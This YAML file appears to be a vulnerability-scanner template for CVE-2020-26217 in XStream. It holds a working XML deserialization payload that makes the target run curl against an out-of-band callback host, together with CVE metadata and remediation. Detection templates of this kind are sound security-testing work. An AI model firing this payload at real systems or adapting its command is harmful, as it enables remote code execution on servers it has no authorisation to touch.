http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
  - part: interactsh_request
    type: word
    words:
    - 'User-Agent: curl'
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<map>\n\
    \  <entry>\n    <jdk.nashorn.internal.objects.NativeString>\n      <flags>0</flags>\n\
    \      <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'>\n\
    \        <dataHandler>\n          <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>\n\
    \            <contentType>text/plain</contentType>\n            <is class='java.io.SequenceInputStream'>\n\
    \              <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>\n\
    \                <iterator class='javax.imageio.spi.FilterIterator'>\n       \
    \           <iter class='java.util.ArrayList$Itr'>\n                    <cursor>0</cursor>\n\
    \                    <lastRet>-1</lastRet>\n                    <expectedModCount>1</expectedModCount>\n\
    \                    <outer-class>\n                      <java.lang.ProcessBuilder>\n\
    \                        <command>\n                          <string>curl</string>\n\
    \                          <string>http://{{interactsh-url}}</string>\n      \
    \                  </command>\n                      </java.lang.ProcessBuilder>\n\
    \                    </outer-class>\n                  </iter>\n             \
    \     <filter class='javax.imageio.ImageIO$ContainsFilter'>\n                \
    \    <method>\n                      <class>java.lang.ProcessBuilder</class>\n\
    \                      <name>start</name>\n                      <parameter-types/>\n\
    \                    </method>\n                    <name>start</name>\n     \
    \             </filter>\n                  <next/>\n                </iterator>\n\
    \                <type>KEYS</type>\n              </e>\n              <in class='java.io.ByteArrayInputStream'>\n\
    \                <buf></buf>\n                <pos>0</pos>\n                <mark>0</mark>\n\
    \                <count>0</count>\n              </in>\n            </is>\n  \
    \          <consumed>false</consumed>\n          </dataSource>\n          <transferFlavors/>\n\
    \        </dataHandler>\n        <dataLen>0</dataLen>\n      </value>\n    </jdk.nashorn.internal.objects.NativeString>\n\
    \    <string>test</string>\n  </entry>\n</map>\n"
id: CVE-2020-26217
info:
  author: pwnhxl,vicrack
  classification:
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    cve-id: CVE-2020-26217
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cwe-id: CWE-78
    epss-percentile: 0.99782
    epss-score: 0.93171
  description: 'XStream before 1.4.14 is susceptible to remote code execution. An
    attacker can run arbitrary shell commands by manipulating the processed input
    stream, thereby making it possible to obtain sensitive information, modify data,
    and/or execute unauthorized administrative operations in the context of the affected
    site. Users who rely on blocklists are affected.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the target system.

    '
  metadata:
    max-request: 1
    product: xstream
    vendor: xstream_project
  name: XStream <1.4.14 - Remote Code Execution
  reference:
  - https://x-stream.github.io/CVE-2020-26217.html
  - https://github.com/x-stream/xstream/commit/0fec095d534126931c99fd38e9c6d41f5c685c1a
  - https://github.com/x-stream/xstream/security/advisories/GHSA-mw36-7c6c-q4q2
  - https://nvd.nist.gov/vuln/detail/cve-2020-26217
  - https://lists.apache.org/thread.html/r2de526726e7f4db4a7cb91b7355070779f51a84fd985c6529c2f4e9e@%3Cissues.activemq.apache.org%3E
  remediation: Fixed in 1.4.14.
  severity: high
  tags: cve,cve2020,xstream,deserialization,rce,oast,xstream_project,vuln
